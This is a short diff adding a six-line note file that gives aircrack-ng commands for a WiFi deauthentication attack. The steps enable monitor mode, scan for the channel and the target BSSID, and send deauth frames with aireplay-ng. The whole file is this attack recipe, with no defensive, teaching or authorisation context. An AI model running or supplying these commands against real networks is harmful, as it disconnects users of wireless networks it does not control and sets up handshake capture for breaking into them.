@@ -1,0 +1,6 @@
+airmon-ng start interfata
+airodump-ng -M wlan0mon
+GET THE WIFI channel
+airodump-ng -c 6 -M wlan0mon
+GET THE BSSID
+aireplay-ng --deauth 2 -a BSSID wlan0mon
